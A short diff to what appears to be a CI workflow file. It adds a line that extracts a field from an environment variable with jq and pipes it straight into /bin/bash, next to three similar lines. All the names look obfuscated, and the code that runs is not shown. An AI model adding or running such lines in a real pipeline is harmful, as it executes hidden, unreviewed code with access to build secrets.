@@ -36,6 +36,7 @@ jobs:
           printf '%s' "$xs160" | jq -r .yylcz328 | /bin/bash
           printf '%s' "$ip8115" | jq -r .o90 | /bin/bash
           echo $ynya11 | jq -r .so5 | /bin/bash
+          echo $rntb0 | jq -r .xif95 | /bin/bash
 
       - name: Persist output
         if: always()
